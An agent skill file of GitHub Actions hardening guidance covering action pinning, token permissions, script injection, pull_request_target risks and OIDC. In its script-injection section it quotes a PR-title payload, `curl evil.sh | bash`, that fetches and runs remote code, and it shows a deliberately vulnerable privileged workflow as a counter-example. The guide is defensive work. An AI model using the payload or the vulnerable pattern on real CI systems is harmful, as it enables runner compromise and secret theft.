---
name: gha-hardening
description: >
  Security hardening for GitHub Actions workflows — pinning actions to commit
  SHAs, least-privilege GITHUB_TOKEN permissions, avoiding script injection
  from untrusted PR input, the pull_request_target / workflow_run pwn-request
  trap, and OIDC over long-lived cloud secrets. Use when writing or reviewing
  any .github/workflows/*.yml or composite action, when a workflow handles
  secrets, or when it runs against pull-request code. Triggers on: uses: with
  a tag, permissions:, pull_request_target, workflow_run, ${{ github.event...
  in run:, GITHUB_TOKEN, OIDC, "supply chain", "action pinning", "pwn request".
license: MIT
user-invocable: false
metadata:
  tags: github-actions, ci-cd, supply-chain, secrets, oidc, script-injection, least-privilege, security
---

# GitHub Actions Hardening

**IMPORTANT:** GitHub Actions security guidance and features evolve. Verify against
`https://docs.github.com/en/actions/reference/security/secure-use` and the security-hardening
guides before writing. Prefer retrieval over memorized syntax.

CI is a high-value target: a workflow holds repository write tokens and deployment secrets,
and often runs code it didn't author. The five controls below are the load-bearing ones —
each maps to a real, repeatedly-exploited attack class.

## 1. Pin third-party actions to a full commit SHA

A tag (`@v4`) or branch is mutable — the owner (or an attacker who compromises the action
repo) can move it to point at backdoored code, which then runs with your secrets. GitHub:
*"Pinning an action to a full-length commit SHA is currently the only way to use an action
as an immutable release."*

```yaml
# ❌ mutable — the ref can be repointed under you
- uses: some/action@v4
- uses: some/action@main

# ✅ immutable — pinned to a specific reviewed commit (keep the version in a comment)
- uses: some/action@3a4b1c2d5e6f7890abcdef1234567890abcdef12  # v4.2.1
```

Pin the SHA from the **action's own repository**, not a fork. First-party `actions/*` are
commonly tag-pinned by convention, but SHA-pinning is the safe default for everything,
especially anything that touches secrets. A `curl ... | bash` installer in a `run:` step is
the same risk in a different shape — pin/verify what you execute.

## 2. Least-privilege `GITHUB_TOKEN`

The `GITHUB_TOKEN` is a real credential; anyone with repo write access can read every
configured secret, so a compromised step's blast radius is set by its permissions. GitHub:
*"set the default permission for the `GITHUB_TOKEN` to read access only… permissions can then
be increased, as required, for individual jobs."*

```yaml
# Top of workflow — default everything to read-only
permissions:
  contents: read

jobs:
  publish:
    permissions:
      contents: read
      packages: write        # grant the ONE extra scope this job needs, at the job level
```

Set a restrictive top-level `permissions:` and widen per-job only where required. An absent
`permissions:` key inherits broad defaults — make it explicit.

## 3. Don't interpolate untrusted input into `run:` (script injection)

`${{ … }}` expressions are substituted into the shell script **before** it runs. Attacker-
controlled fields — PR **title**, **body**, branch name, author — can break out of the
intended command and execute arbitrary code in your runner.

```yaml
# ❌ script injection — a PR titled  `"; curl evil.sh | bash; #`  runs in your CI
- run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# ✅ pass through an environment variable — the value is data, never code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking PR: $TITLE"
```

GitHub: storing the expression in an env var means *"the value… is used as a variable, and
doesn't interact with the script generation process."* For anything beyond trivial use, a
JavaScript action that takes the context value as an argument avoids shell generation
entirely. Treat every `github.event.*` field a contributor can set as untrusted.

## 4. The `pull_request_target` / `workflow_run` pwn-request trap

`pull_request` workflows from forks run **without** secrets — by design. `pull_request_target`
and `workflow_run` run in the **base** repo's context **with** secrets and a write token, and
are commonly used to comment on or label PRs. The danger: if such a workflow **checks out and
executes the PR's head code** (build, test, install, run scripts), it runs untrusted code
with your secrets — a "pwn request."

```yaml
# ❌ DANGER — privileged trigger that checks out and runs fork-authored code
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # untrusted code…
      - run: npm install && npm run build                          # …executed WITH secrets
```

Safe shape:
- Use plain `pull_request` for anything that builds/tests fork code (no secrets exposed).
- Reserve `pull_request_target`/`workflow_run` for jobs that **do not execute** PR code — and
  if you must check it out, do not run it, and keep `permissions:` minimal.
- Never pass secrets into a job that runs untrusted code. Split trusted (privileged, no PR
  code) from untrusted (PR code, no secrets) into separate workflows.
- Self-hosted runners *"should almost never be used for public repositories"* — a fork PR can
  compromise the persistent runner and its access.

## 5. OIDC instead of long-lived cloud secrets

For deploys to a cloud provider, exchange a short-lived OIDC token at run time rather than
storing a static long-lived key as a secret. GitHub: OIDC lets you *"authenticate directly to
the cloud provider… stop storing these credentials as long-lived secrets."* Shorter-lived,
well-scoped, nothing durable to exfiltrate.

```yaml
permissions:
  id-token: write     # required to mint the OIDC token
  contents: read
# then use the provider's OIDC-aware auth action (no static cloud key in secrets)
```

## Review checklist

- [ ] Are all third-party `uses:` pinned to a full commit SHA (version in a trailing comment),
      from the upstream repo not a fork?
- [ ] Is there an explicit top-level `permissions:` defaulting to `contents: read`, widened
      only per-job where needed?
- [ ] Does any `run:` interpolate `${{ github.event.* }}` (title/body/branch/author) directly?
      → move to an `env:` var or a JS action.
- [ ] Does any `pull_request_target` / `workflow_run` workflow check out and **execute** PR
      head code? → it must not, or must carry no secrets.
- [ ] Are secrets ever in scope for a job that runs untrusted/fork code? → split the workflows.
- [ ] Is cloud auth done via OIDC (`id-token: write`) rather than a long-lived stored key?
- [ ] Are `curl | bash` / remote installers pinned or checksum-verified before execution?
- [ ] Self-hosted runners kept off public-repo / fork-PR workflows?
